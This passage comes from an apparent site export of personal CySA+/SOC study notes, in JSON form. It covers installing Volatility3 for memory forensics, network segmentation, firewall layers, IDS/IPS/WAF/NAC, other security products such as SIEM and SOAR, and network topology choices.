github.com/volatilityfoundation/volatility3.git\n\n\nYou change to the ‘volatility3’ directory\ncd volatility3/\n\n\nRun “python3 setup.py build” command\npython3 setup.py build\n\n\nRun “python3 setup.py install” command\npython3 setup.py install\n\n\nTo install the most minimal set of dependencies use a command such as\npip3 install -r requirements-minimal.txt\n\n\n\nThe installation of Volatility3 is now complete and the tool is ready for use. We will explain how to use Volatility3 in the next lessons.\nConclusion\nIn the digital age, cybersecurity, and forensics have become increasingly important, and memory forensics has become a fundamental tool for analyzing cybercrimes and security breaches, especially on Linux systems. At its core, LiME is a memory dump collection and analysis tool that securely retrieves valuable data from system memory, while Volatility provides detailed analysis of that data. Both tools are valuable resources for forensic analysts and are used in a variety of areas including malware detection, debugging, and user activity monitoring. Effective use of these tools allows for more detailed and accurate forensic analysis."},"SOC/Cysa+-Prep/Linux-Memory-Forensics/index":{"slug":"SOC/Cysa+-Prep/Linux-Memory-Forensics/index","filePath":"SOC/Cysa+ Prep/Linux Memory Forensics/index.md","title":"index","links":["SOC/Cysa+-Prep/Linux-Memory-Forensics/Introduction-to-Linux-Memory-Forensics","SOC/Cysa+-Prep/Linux-Memory-Forensics/Capturing-Memory-Dumps","SOC/Cysa+-Prep/Linux-Memory-Forensics/Analyzing-the-Memory-Dump","SOC/Cysa+-Prep/Linux-Memory-Forensics/Basic-Memory-Analysis","SOC/Cysa+-Prep/Linux-Memory-Forensics/Case-Studies-and-Practical-Examples"],"tags":[],"content":"1. Introduction to Linux Memory Forensics\n2. Capturing Memory Dumps\n3. Analyzing the Memory Dump\n4. Basic Memory Analysis\n5. Case Studies and Practical Examples"},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Application-Based-Segmentation":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Application-Based-Segmentation","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/Application-Based Segmentation.md","title":"Application-Based Segmentation","links":[],"tags":[],"content":"Another important approach is application-based segmentation.  This method controls the traffic to certain parts of the network by dividing network traffic using specific applications or application groups. It is usually used when it is necessary to isolate certain applications, services, or types of data on a network. This may help enhance security and network performance.\nApplication-based segmentation is usually performed using a network security device, such as a firewall, or an Application Delivery Controller (ADC). These devices can enforce specific network policies tailored for particular applications or services. For instance, they can be utilized to curtail excessive network usage by a specific application or to guarantee elevated priority for a particular application over others.\nThe implementation of application-based segmentation usually involves the following steps:\n\n\nDetermining the applications and services to which application-based segmentation will be applied\nIf certain applications or services need to be isolated or subject to a specific network policy, you need to determine which applications or services will be segmented.\n\n\nInstalling and configuring a network security device that supports application-based segmentation\nApplication-based segmentation is usually performed using a network security device, such as a firewall or ADC. This device must implement and enforce certain network policies for specific applications or services.\n\n\nDefining the implementation policies and implementing them properly\nIt’s essential to formulate and implement distinct network policies for every application or service. This delineates the permissible network resources, incoming and outgoing traffic that a given application can utilize.\n\n\nTesting and monitoring\nIt is important to test the network to verify that the application-based segmentation is configured correctly and works as expected.\n\n\nSegmentation based on applications can enhance network performance and security, but it can introduce increased complexity in network management. Hence, it’s imperative to execute application-based segmentation with meticulous planning."},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Firewalls-and-Types":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Firewalls-and-Types","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/Firewalls and Types.md","title":"Firewalls and Types","links":["Networking/OSI-Model","Networking/IP-Address","Networking/NAT","Networking/TCP","Networking/UDP","HTB/FTP","Networking/DNS"],"tags":[],"content":"An Overview of Firewalls\n\nA firewall is a network security device used to protect a computer network from potential malicious threats. It controls inbound and outbound network traffic to ensure the security of a particular network by creating a barrier between two networks.\nFirewalls are often used to separate a company’s private network (usually a local area network or LAN) from a public network such as the Internet. A firewall allows or blocks certain traffic from passing through, usually by examining all traffic coming into and leaving the network.\nTo do this, firewalls usually use a security policy or set of rules. These rules determine which types of traffic will be allowed to pass and which types of traffic will be blocked. For example, a firewall may block traffic from certain IP addresses or only allow traffic to certain types of services or applications (for example, email or web browsing).\nIn addition, firewalls can provide various security features. Some can identify malicious signs like attacks or malware through network traffic analysis. Others enable secure network connections, like VPNs (Virtual Private Networks), ensuring remote employees connect safely to the corporate network.\nShortly, a firewall is a critical tool for protecting the network, blocking malicious threats, and preventing data breaches and other security incidents.\nIn this section, we will discuss firewall technologies in detail.\n\nIt is possible to classify firewalls in different ways. For example, when we classify based on their structure, it is possible to divide them into two groups as “Hardware” and “Software”. If we are to classify them according to their location, we can again divide them into two groups; “Network-Based” and “Host-Based”. \nThe most common of these classifications is the perspective, in which they are classified according to the OSI layers they support. Let’s take a look at the types of firewalls with this approach:\nLayer 3 (Network Layer) Firewalls (Packet Filtering Firewall)\nNetwork layer firewalls operate at layer 3 of the OSI model and control network traffic based on IP addresses. Such firewalls filter traffic by examining IP-level information such as source IP address, destination IP address, protocol type, and port numbers using packet filtering methods. They are often used in gateways or routers.\nA Layer 3 firewall is usually located at the Network Layer, which is responsible for routing and forwarding data packets in a network. Such firewalls control traffic based on IP addresses, protocols, and other layer 3 information. Layer 3 firewalls are typically used to filter both inbound and outbound traffic.\nLayer 3 firewalls control traffic in a number of different ways. Typically, techniques such as network address translation (NAT), port address translation (PAT) are used.\nNAT and PAT manage the traffic in and out of the network while hiding the IP addresses and ports of the devices on the network. This not only makes it harder for people outside the network to discover the network, but also helps to streamline network traffic.\nLayer 3 firewalls are generally stateless. This means that they treat each packet as an independent unit, and they usually decide based on the packet’s source or destination IP address, protocol, or ports. These decisions are usually based on a set of predetermined rules.\nLayer 4 (Transport Layer) Firewalls (Stateful Inspection Firewall)\nTransport layer firewalls operate at layer 4 of the OSI model and are based on transport layer protocols such as TCP (Transmission Control Protocol) and UDP (User Datagram Protocol). Such firewalls analyze network traffic based on source and destination port numbers, link state, and transport protocol. They can monitor traffic by doing due diligence and filter according to security policies.\nThe Layer 4 (Layer 4) firewall is located in the Transport Layer, which controls the transport of data packets in the network. These firewalls decide on the source and destination IP addresses of the packets as well as the TCP or UDP ports used. They can usually examine network traffic at a deeper level and control the flow of data over a particular port whether a particular application is using it or not.\nLayer 4 firewalls are often used to filter both inbound and outbound traffic. They are quite important for protecting and controlling a network. It is especially critical to block malicious traffic and regulate the flow of data on the network.\nThese types of firewalls are also often referred to as stateful because they can keep track of a “session” or “connection” state. That is, they can monitor all stages of a packet’s journey over the network and make decisions accordingly. This provides more sophisticated security because these firewalls can take into account the past activity of a particular session or connection.\nThis stateful control goes a step further than Layer 3 firewall because it also takes into account general traffic patterns and connection states on the network, rather than relying solely on individual characteristics of packets.\nEspecially in a network with sensitive or private information, such a control mechanism can be an important tool for providing enhanced network security.\nLayer 7 (Application Layer) Firewalls (Application Level Firewall)\nApplication layer firewalls operate at the 7th layer of the OSI model and analyze application-level protocols and data communications.\nThe Layer 7 firewall is located in the Application Layer, which is the top layer of the network model. Such firewalls can usually do a much deeper data inspection. They analyze incoming traffic over application protocols such as HTTP, HTTPS, FTP, DNS.\nLayer 7 firewalls have the ability to determine what type of data a particular application or service can send and receive. For example, it can examine and control incoming HTTP or HTTPS requests to a web application or service. This way, they can only allow certain types of requests while blocking other types of requests.\nIn addition, such firewalls can often analyze the traffic patterns of a particular application or service and detect abnormal or suspicious activity. This provides extra protection, especially against sophisticated threats such as denial of service (DoS) attacks or application level attacks.\nLayer 7 firewalls typically provide much more visibility and control over what’s going on at the application layer of a network. This is crucial to improve network security and better manage potential threats. However, properly configuring and managing this type of firewall is often more complex and requires more technical knowledge.\nThe order we gave above actually also refers to the historical development of firewall devices. At the point reached today, manufacturers are adding more features to their products every day due to both consumer needs and marketing strategies. For this reason, almost all of the products marketed today support Layer 7, in addition to these, they promise a very effective protection not only based on rules and signatures, but also with the support of machine learning, artificial intelligence technologies and real-time threat intelligence.\n\nCloud Based Firewall\nWith the development of cloud technologies, the ”… as a service” business model, the concept of cloud based firewall has inevitably entered our lives. Cloud Based Firewalls are firewalls that technically have all the features of L7 firewalls, but that you purchase as a service, not a product.\nOne of the biggest advantages of cloud-based firewalls is scalability and flexibility. You can easily access more capacity or reduce capacity when you need it. In this way, the amount you will pay is shaped according to your needs. So, the amount of payment also varies, depending largely on how much you need.\nAnother advantage of cloud-based firewalls is that they are usually faster and easier to update. To quickly provide protection against new threats and zero-day attacks, the firewall must be up-to-date at all times. Cloud-based services usually implement such updates automatically, ensuring that your network is constantly protected against the most up-to-date threats.\nAs a result, cloud-based firewalls offer greater scalability, flexibility, and ease of use compared to traditional firewalls, while also offering advanced security features and the ability to update quickly. However, it is important to remember that trust in cloud services and the reliability of the cloud provider are vital to the success of this type of security solution."},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/How-to-Implement-Network-Based-Segmentation":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/How-to-Implement-Network-Based-Segmentation","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/How to Implement Network-Based Segmentation.md","title":"How to Implement Network-Based Segmentation","links":[],"tags":[],"content":"You can use several different approaches for network segmentation. For example, physical segmentation is often performed using routers, switches, and other network equipment. This is a useful way to divide a network into several geographically distributed subnets. However, this technique is often both expensive and complicated because the hardware needs to be physically positioned and configured.\nPhysical segmentation is a type of network segmentation that usually takes place using network hardware. Physical segmentation of a network usually involves distributing the hardware that directs network traffic, such as routers and switches, to specific parts of the network. This breaks up a network into smaller and more manageable chunks, while also providing greater control and security.\nAnother approach is software-based segmentation. This is usually performed using virtual networks or VLANs. VLANs are virtual networks that run on a specific physical network and are usually configured on a series of switches. This type of segmentation can separate network traffic by different services, departments, or user groups.\nThe way VLANs (Virtual Local Area Network) work is based on a specific protocol implemented by network devices and protocols. VLANs are usually implemented in Layer 2 (data link layer) network switches and these switches support VLANs by tagging Ethernet frames with VLAN tags.\nWhen a VLAN is created on a network switch, a unique ID is assigned to each VLAN. This ID is usually attached to Ethernet frames using a protocol known as 802.1Q tagging. This tag indicates which VLAN it belongs to. When an Ethernet frame arrives at a switch port, the switch looks at the frame’s VLAN tag and decides which VLAN it belongs to.\nIn this way, devices in one VLAN are isolated from devices in other VLANs because each VLAN creates a separate broadcast domain. Devices in VLANs act as if they are in the same logical network, even though they are in the same physical network. This allows, for example, different departments of a company to share the same physical network infrastructure, but logically isolated from each other.\nLet’s look at the example in the image below. There is a company and the company has employees working on different floors. The systems on each floor are connected to the switch of that floor. These switches are interconnected with the switch in the datacenter. Datacenter has a “Finance” server and a “Devops” server. \nIn cases where we do not configure any VLANs, “Accounting” and “CFO” employees will also be able to access the “Devops” server as they are on the same network. Likewise, “Developers” will have access to the “Finance” server. But if we move “Developer” systems and “Devops” server to VLAN No. 111, “CFO”, “Accounting” employees and “Finance” server to VLAN No. 222. Even if they are on the same physical network, they will not be able to communicate with each other. This abstraction will be happening on the switches.\n\nHowever, when data transmission from one VLAN to another is required, a Layer 3 device (usually a router) is needed. The router must be capable of routing data from different VLANs, this process is often referred to as “inter-VLAN routing”. This allows data to pass securely between different VLANs, but ensures that each VLAN remains isolated from each other.\nVLANs often make network management easier and more flexible because network administrators can group and separate specific devices regardless of the physical location of the devices. This also improves security because VLANs can be used to limit access to sensitive data."},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Security-Products-(IDS,-IPS,-WAF,-and-NAC)":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Security-Products-(IDS,-IPS,-WAF,-and-NAC)","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/Network Security Products (IDS, IPS, WAF, and NAC).md","title":"Network Security Products (IDS, IPS, WAF, and NAC)","links":["SOC/SOC-Analyst-Notes/Web-Application-Firewall"],"tags":[],"content":"Intrusion Detection Systems(IDS)\n\nIntrusion Detection Systems(IDS) are quite interesting and complex tools. In fact, you can think of it like a guardian of a network.\nIDSs generally monitor and examine network traffic continuously. For this they are usually placed at the core of a network where they monitor all data packets to and from the internet or other parts of your network. They act as an observer to make sure everything is going right and no one is harming your network.\nIDSs detect potential threats, often using a number of different methods. There are two main types of IDS: “Anomaly-based IDS” and “Signature-based IDS”.\nAnomaly-based IDS\nThis kind of IDS learns the typical data traffic patterns within your network and notifies you in the presence of anomalies. For instance, if a user notices that their regular data downloads are minimal and suddenly witnesses a significant surge in download activity, they might suspect an attack and trigger an alert. However, it’s important to acknowledge that such IDS systems could potentially generate false positives—incorrectly identifying regular harmless activities as threats.\nSignature-based IDS\nSuch IDs use the “signatures” or patterns of known attacks. That is, they describe previously known harmful behaviors and attack techniques. This is similar to how virus scanning software searches for a specific signature of a virus. While such IDS systems can frequently demonstrate high accuracy, their capability is limited to identifying threats that have been documented before. Detecting novel and unknown attacks can prove challenging for them.\nBehavior-based IDS\nBehavior-based IDS determines normal and abnormal behavior patterns by analyzing data such as network traffic, system activities, and user behavior. The system has a predefined set of behavioral rules or algorithms, and these rules are used to detect unusual or potentially dangerous behavior in the system.\nThis type of IDS, unlike signature-based IDS, uses techniques such as statistical analysis, artificial intelligence, or machine learning to identify anomalies or behavioral deviations, rather than relying on known threat signatures. As a result, the potential to identify unfamiliar or specifically targeted attacks might be enhanced.\nFurthermore, contemporary IDS products can also operate with data feeds obtained from real-time threat intelligence sources, enhancing their functionality through reputation-based analysis.\nFinally, it should be noted that hybrid products that have adopted more than one of these approaches are also available in the market. \nIDS products typically function by analyzing a mirrored copy of network traffic, as they solely observe without taking any direct actions. This approach offers the advantage of not impeding real-time network traffic speed, as the examination occurs without direct interaction. Additionally, this method facilitates the utilization of a more extensive range of rules. However, this operational mode’s drawback is its retrospective nature, it detects events after their occurrence. When properly scaled to the traffic volume under examination, this delay within a suitably configured IDS device is typically measured in seconds.\n\nIDs are often used as part of a network security strategy and often work in harmony with other security tools and systems.\nIntrusion Prevention Systems(IPS)\nIDs and IPS share commonalities as both oversee network traffic to identify potential threats. However, IPS, or Intrusion Prevention System, takes it a step further, not only detecting but also aiming to stop or minimize attacks.\nUnderstanding an IPS requires examining its network connection. It’s usually positioned on the network’s core, the vital data pathways. Here, it continually monitors and regulates traffic. Unlike IDS, IPS is positioned inline, meaning traffic enters the IPS device first. After analyzing the traffic, if it deems it malicious, it stops the traffic; if not, it lets the traffic through. This approach’s notable drawback is the risk of network delays, leading to a more restrained ruleset compared to IDS.\n\nWhen an IPS detects a particular attack pattern or signature, it can automatically trigger a sequence of responses. These typically include actions like blocking malicious packets, rerouting harmful traffic, or even intentionally slowing down the network to impede malicious activity.\nAdditionally, an IPS might endeavor to pinpoint the source of the attacks and isolate it from the network. This safeguards against internal threats or attacks stemming from within the network.\nThe specific actions undertaken by an IPS are generally configured by the system administrator or security team. IPS systems are usually highly customizable, allowing adjustments to align with network needs and specific requirements.\nFor effective operation, an IPS requires continual updates and maintenance. Regular updates to the threat signature database are crucial to guard against recognized threats. Additionally, to counter new and unknown threats, IPS can often leverage advanced detection methods like behavioral analysis.\nIn summary, IPS acts as a proactive sentinel. Beyond just identifying potential network threats, it tries to prevent or minimize their impact. This proactive defense is pivotal for reinforcing network security, yet for an IPS to yield optimal results, it necessitates accurate configuration and consistent updates.\nWeb Application Firewall (WAF)\n\nWeb application firewalls are tailored to counter threats against web applications. They are normally positioned in front of a web application, they regulate all incoming HTTP/HTTPS traffic. These systems scrutinize incoming requests and assess them against a predefined rule set to determine if the request poses a threat or is benign.\nThe fundamental premise of a WAF lies in addressing the inherent vulnerabilities often faced by web applications. Attacks like “SQL Injection” and “Cross-Site Scripting (XSS)” serve as common techniques to compromise web application security.\nA WAF offers specialized safeguarding against such vulnerabilities. Traditional firewalls may not inherently shield against these risks as they primarily manage lower-level network traffic. However, a WAF is uniquely focused on the content of HTTP/HTTPS traffic, enabling it to pinpoint application-level threats.\nFor instance, a WAF can check an HTTP request to ascertain if it corresponds to a “SQL Injection” attempt. In case of a match, the request is blocked, effectively stopping the attack.\nSimilarly, a WAF can also identify a “Cross-Site Scripting (XSS)” attack. In such cases, attackers aim to embed malicious scripts into a web application. The WAF identifies and neutralizes this type of threat.\nWAFs are typically adaptable and can be tailored to align with the distinct needs and vulnerabilities of your web application. Rules can be consistently updated to ensure protection against evolving threats.\nIn essence, WAFs constitute a specialized firewall variant meticulously crafted to safeguard web applications. As such, they hold immense significance for web-centric enterprises and services. They are often used in conjunction with other security measures and are an important part of a network security strategy.\nWAF products can be situated on-premises or obtained as cloud-based services, offering flexibility in implementation.\nNetwork Access Control (NAC)\nNetwork Access Control serves as a security solution aimed at regulating network access and defining activities permitted within the network. Essentially, NAC governs inbound and outbound network traffic based on specific guidelines. These guidelines typically factor in user credentials, device attributes, schedules, and at times, even the user’s physical location.\nAt its core, NAC operates on the premise that all network users are not equivalent. Some users necessitate access to specific resources, while others require restricted privileges. Similarly, a user’s network interactions might be confined to certain timeframes or geographic locations. NAC functions to enforce such policies, ensuring controlled and tailored network access.\nA NAC system usually consists of several components:\nAuthentication\nNAC uses authentication methods to verify a user’s identity and their entitlement to network access. This typically involves utilizing details like a username and password, or occasionally a hardware ID.\nDevice Control\nNAC may perform a device audit to ensure that devices connected to the network are secure and have up-to-date security patches. If device security is not sufficient, NAC may limit or block access.\nPolicy Management\nNAC is used to manage and implement network policies, with policy management standing as a cornerstone of its functionality. These policies determine network access privileges, device permissions, and authorized activities. For instance, they might define that a specific user category can access designated network resources or that a certain device type is permitted network connection."},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Security-Products-2":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Security-Products-2","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/Network Security Products-2.md","title":"Network Security Products-2","links":[],"tags":[],"content":"Products such as Firewall, IDS, IPS WAF, NAC, which we talked about in the previous topics, are indispensable technologies and products to securely control a network. But today, these products alone may not be enough to prevent all risks. For this reason, it is important that they are supported by technologies such as EDR/XDR, PAM, Email Gateway, and Sandbox. Since these products are not directly related to network security, we do not go into details in this section, but it would be useful to briefly take a look at what they are to get an idea:\n\nEndpoint Detection and Response (EDR)\nEndpoint Detection and Response provides continuous monitoring of devices (computers, mobile devices, servers, etc.) connected to a network and detection of potential threats on these devices. An EDR system usually monitors what each device is doing. If it detects an anomaly in the behavior of a device, it can immediately issue a warning or even stop a certain process.\nEDR systems often protect against many different types of threats, including malware, zero-day attacks, and even more sophisticated and advanced threats.\nExtended Detection and Response (XDR)\nXDR extends the capabilities of EDR and enables greater integration and automation between various security products. XDR systems often include EDR as well as network monitoring, cloud security, email security, and other security components.\nThe main advantage of XDR is its ability to detect and respond to threats, often in a broader context. This usually automatically consolidates and analyzes security alerts and events. This helps security teams respond to threats faster and more effectively.\nBoth systems are important tools used to strengthen organizations’ defenses against cyber threats. Which system to use often depends on an organization’s specific needs and resources.\nData Loss Protection (DLP)\nThe main purpose of DLP systems is to ensure that organizations comply with various regulations and to prevent incorrect sharing of sensitive and private data. These regulations may often relate to the privacy of personal data, the security of financial information, or intellectual property rights.\nTo understand how a DLP system works, we can think of a security check at an airport. If you find something in your luggage that you are not allowed to take with you, security will ask you to remove it. DLP works the same way; prevents certain types of information from leaving the network.\nVirtual Private Network (VPN)\nIn essence, a VPN creates a secure tunnel over the internet, encrypting your data and giving you private and anonymous access to the internet. This tunnel protects all your internet traffic, preventing your data from being tracked or intercepted by third parties.\nFirst off, VPNs increase data security. Organizations often work with sensitive and proprietary information (customer information, financial data, employee records and more). VPNs encrypt internet traffic to prevent this information from being tracked or intercepted by third parties. This helps prevent data from falling into the wrong hands, especially if employees are using unsecured networks such as public Wi-Fi networks.\nSecond, VPNs support remote work. During and after the pandemic, many employees began working from home or other remote locations. VPNs allow these employees to securely access the organization’s network. This allows employees to do their jobs securely from anywhere.\nThird, VPNs allow bypassing geo-restrictions. Some websites or services may not be accessible to users in certain regions. VPNs allow a user to circumvent these restrictions by passing their internet traffic through a different location. This can help organizations do business in certain markets or access certain resources.\nFinally, VPNs can help organizations comply with regulations. Certain industries have specific regulations on data security, particularly in areas where sensitive information is common, such as healthcare and finance. VPNs can provide an additional layer of security to comply with these regulations.\nRemote Access VPN\nThis type is usually used by those who work from home or are on a travel. A Remote Access VPN allows the user to securely access a private network remotely.\nSite-to-Site VPN\nSite-to-Site VPN is often used by large organizations that have offices in multiple physical locations. Site-to-Site VPN creates a secure network connection between different locations so all locations work like one private network.\nSIEM (Security Information and Event Management)\n\nUp to this point, we have known the security tools that can be used to build a secure and sustainable network. But we also have to say that building the network is not where the work ends, but where it actually begins. Continuous, real-time monitoring and evaluation of events are required for a network to remain secure.\nAll the products, network devices and operating systems we have been talking about so far as in our working environment are systems that generate logs constantly and store them. When necessary, we can go to each of these products and examine these logs one by one. But if we’re running a large organization, that means millions of rows of data at thousands of points, and it’s not manageable to go through and review all these logs. In addition, in many of these systems, the log storage capacity is very limited and access to historical logs is often not possible.\nThe answer of the companies that produce solutions for the sector has been SIEM products.  \nSIEM stands for Security Information and Event Management. These systems are often used to monitor, detect and respond to security incidents in large-scale IT environments.\nSIEMs are a type of surveillance system that combines and analyzes all security-related information on an organization’s network. These can include log files and other types of data from network devices, servers, applications, and even users’ workstations. The SIEM system receives and analyzes this data, detects deviations from normal, and generates alerts when necessary.\nThe way a SIEM works usually depends on the specific requirements and configuration of the organization. But usually, they include the main components such as data collection, event correlation, alert generation, and reporting.\nData collection\nSIEM usually collects security-related data from a large number of different sources on the network. This usually includes log files, but it can also include network traffic analysis, user behavior analysis, and more.\nCorrelation\nSIEM often brings together a large number of different events and analyzes them in a broad context. This makes it possible to determine whether an event is part of a single negative event.\nCreating an alert\nIf the SIEM detects a deviation from the normal or a possible safety event, it usually generates an alert. This allows the security team to respond quickly to the incident.\nReporting\nFinally, SIEM usually provides an overall picture of the security situation. This is usually done with detailed reports containing various graphs, tables, and other visual elements.\nSIEMs have many advantages for organizations. The most obvious advantage is perhaps the rapid detection and response of a security incident. A SIEM can often detect a security incident much faster, which can significantly reduce the organization’s response time to the incident.\nSIEMs are also important for regulatory compliance. In most industries, organizations are required to comply with certain security standards, and SIEMs provide the extensive records and reports needed to establish and demonstrate compliance with these requirements.\nFinally, a SIEM often provides an overview of an organization’s security status. This makes it easy for the security team to understand the overall security situation and make strategic changes as needed. Therefore, a SIEM can be an important part of an organization’s overall security strategy.\nSecurity Orchestration, Automation and Response (SOAR)\n\nSecurity Orchestration, Automation, and Response (SOAR) consists of a set of technologies that help improve and automate an organization’s capabilities to respond to security threats.\nSOAR platforms integrate with a number of different security technologies, including SIEM, and “orchestrate” them to work together. This allows organizations to combine multiple threat detection resources and create a broader security outlook.\nPerhaps the most important feature of SOAR is its ability to automate security operations. This can speed up the processes of responding to simple threats and provides security teams with the opportunity to focus on more complex and urgent threats. SOAR can also increase its ability to respond more quickly to security incidents by speeding up threat detection and response processes.\nSOAR platforms also include creating response scenarios, or “playbooks,” to streamline the process of responding to threats. This automates and standardizes the steps to be followed when a security incident is detected.\nThere are several advantages that SOAR offers for organizations:\nProductivity\nSOAR empowers security teams to counter threats quickly and efficiently, resulting in expedited threat resolution and minimized potential damages.\nMore visibility\nSOAR provides an overview of the security posture of an organization. This allows security threats to be managed more effectively.\nAutomation\nSOAR can automate the threat detection and response processes. This means faster response times and less manual intervention.\nRisk reduction\nSOAR can reduce the overall risk by ensuring that a security incident is handled quickly and effectively.\nShortly, SOAR can enhance and automate an organization’s security operations, which often means faster threat detection and response times and overall more effective security situation management."},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Topology-Design":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Topology-Design","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/Network Topology Design.md","title":"Network Topology Design","links":[],"tags":[],"content":"When designing a secure network infrastructure, it is a must that we should consider both the physical and logical dimensions of network topology. In this section, we will explore various categories of the network topology. Before diving into these topology types, we should mention the criterias that we should consider when determining our optimal topology. Some of those criterias are as follows:\nCommunication Requirements\nFirst, we need to evaluate the communication requirements of the network. This will involve determining which devices or systems need to communicate, how they need to communicate, and how much data needs to be transmitted. The network topology should provide the structure that best meets these communication requirements.\nScalability\nFuture growth and expansion need of the network should be considered. The chosen network topology must not only address current demands but also be geared towards supporting the future needs and potential expansions. Scalability simply shows the network’s capacity to expand effortlessly along with the addition of new devices or users.\nPerformance and Speed\nPerformance factors such as communication speed, latency, and data transfer rate should be evaluated. The topology should ensure that communication is fast and reliable. If the network is traffic-intensive and requires high performance, the topology should be optimized to meet those standards.\nFacility of Management and Maintenance\nThe network topology should be designed to facilitate management and maintenance processes. Network administrators must be able to efficiently carry out tasks like device configuration, error monitoring, troubleshooting, and updates. Therefore, the topology should be structured in a way that seamlessly accommodates these essential operational processes.\nCost\nThe cost of the network topology should also be taken into consideration. We should evaluate hardware, software, and installation costs and provide a solution that is suitable for the budget. Additionally, we need to assess the operating cost of the network. A more complex topology may require more management and maintenance, which may increase the operating costs.\nReliability and Redundancy\nNetwork reliability and redundancy is critically important. The topology must ensure uninterrupted communication and minimal data loss in the event of a single-point failure. In such scenarios, it’s crucial to incorporate redundancy and implement robust backup strategies.\nFeasibility\nUltimately, the chosen network topology must align with the requirements of the installation and implementation processes. It’s imperative to consider available resources, capabilities, and technical expertise. The selected topology should also harmonize with the existing organizational infrastructure and resources.\nIn reality, we should note that it may not be possible to bring all these criteria together. In fact, not all these criteria may always be necessary. The selection of a specific topology is interconnected with the services that will operate on the network you’re designing and is closely tied to the individual requirements of these components.\nFor a more concrete illustration, consider a scenario where we’re designing a network for a financial technology company that processes thousands of transactions per second. In this context, if the potential material and reputational losses resulting from network downtime or slowdowns will be a lot then the network must be planned to prioritize criteria like performance, speed, and redundancy over cost considerations. This approach requires accepting higher costs to ensure a robust network with operational interruption.\nIf we are designing a network for a content-publishing service that stores some static content, where occasional outages are not a problem, we can then put the redundancy on the back burner and move the cost forward.\nShortly, determining the needs correctly before starting the work, making the projections correctly is the basis of establishing a correct network.\nEssentially, three types of network topologies are available when designing a network architecture. You should keep in mind that these topologies can also work together. In fact, the most important point of a well-designed and smooth-running network is the use of the right topologies in the right place and the correct establishment of their relations with each other.\n\nThe properties of these 3 topologies mentioned above are as follows:\nStar Topology\n\nStar topology is widely used in small and medium-sized networks. \nIt is often preferred in office environments, small businesses, or residential networks.\nDevices connected to the central switcher provide high-speed data transmission and facilitate network traffic management.\nIn the event of a failure in one of the connected devices, the other devices remain unaffected, so the star topology provides high availability.\nStar topology makes it easy to add new devices or remove existing devices from the network.\n\nTree Topology\n\nTree topology is preferred in large-scale networks and is often used in enterprise networks.\nIt creates a hierarchical structure in the form of sub-switchers connected to the main switcher and devices connected to these sub-switches.\nIt is suitable for complex network structures such as large organizations or campus networks.\nThe use of sub-switchers makes it easier to organize and manage network traffic.\nIn case of failure of the main switcher, only the devices connected to the sub-switcher are affected, which ensures the continuity of the network.\n\nFull Mesh Topology\n\nMesh topology is usually used in small-scale networks or special-purpose networks.\nEach device has a direct connection to all other devices on the network.\nExamples of applications include fields such as scientific research networks, supercomputer networks, or military communications networks.\nThe complete network topology ensures high-speed data transmission and low latency.\nThe infrastructure cost is higher and more complex because each device is connected to every other device.\n\nEach network topology offers advantages for different requirements and usage scenarios. The choice of topology depends on factors such as the size of the network, performance needs, security requirements, budget, and number of users."},"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Based-Segmentation":{"slug":"SOC/Cysa+-Prep/Network-Design-and-Security-Products/Network-Based-Segmentation","filePath":"SOC/Cysa+ Prep/Network Design and Security Products/Network-Based Segmentation.md","title":"Network-Based Segmentation","links":[],"tags":[],"content":"Network segmentation involves partitioning the network into discrete, isolated zones. Each zone enforces distinct traffic regulations through dedicated security policies and controls. Network-based segmentation comes with the following advantages:\nLimits the Spread of Attacks\nSegmentation acts as a barrier against the expansion of network attacks into other sectors. In the absence of segmentation, a single extensive network area could potentially impact the entire network in the event of an attack. Fortunately, segmentation limits attacks to their respective segments, averting their spread to unaffected areas.\nReduces Insider Threats\nSegmentation plays a vital role in curbing the dissemination of insider threats as well. For instance, if a user or device engages in malicious activities, the impact remains limited solely to the pertinent segment. Access to resources in other segments is restricted, effectively halting the proliferation of threats.\nEnsures Data Privacy and Isolation\nSegmentation serves as a shield for privacy by segregating different clusters containing sensitive data from the rest. For example, having the finance department within a distinct and isolated segment protects unauthorized access to financial information. Furthermore, segments with distinct functions ensure regional isolation by segregating data traffic.\nImproves Network Performance and Manageability\nSegmentation contributes to enhanced network performance and streamlined management. Handling traffic within smaller segments translates to simplified monitoring and improved control. Furthermore, this approach reduces overall network traffic and minimizes conflicts, resulting in a notable performance boost.\nImplements Security Controls and Policies\nSegmentation allows the implementation of separate security policies in each segment which can be configured with its firewalls, network monitoring tools, and access controls. In this way, security controls and policies are implemented more effectively, and network vulnerabilities are reduced.\nSegmentation is one of the cornerstones of secure networking. From a security perspective, better isolation prevents the spread of attacks and limits access to sensitive data. In addition, it improves network performance and simplifies management. Therefore, segmentation plays an important role in a reliable network design.\nThe following items are essential steps for executing a successful segmentation of a network:\nDefining Regions and Resources in the Network\n\n\nYou should divide the network into clusters and determine the segments. This requires careful analysis of the network structure. By identifying the servers, network devices, users, and other resources on your network, you will have completed the basic steps for segmentation.\n\n\nIt is important that you should understand the dependencies and communication requirements between the departments or systems involved. This allows you to accurately design segmentation by specifying the data flow and requirements.\n\n\nAssessing Security Needs\n\n\nYou should fully evaluate the security requirements of each segment. This includes security requirements such as data privacy, integrity, authorization, authentication, and access controls.\n\n\nYou must determine the levels of sensitive data between the segments and set the security levels accordingly. Segments with critical data will require tighter security measures and access controls.\n\n\nDefining Subnets and IP Address Ranges\n\n\nYou must create a separate subnet for each segment and correctly specify the IP address ranges. This will enable traffic routing between segments and isolate traffic between segments.\n\n\nWhen determining the IP address ranges, you should be careful and configure the subnet masks correctly to avoid conflicts.\n\n\nImplementing Network Segmentation\n\n\nFor each segment, 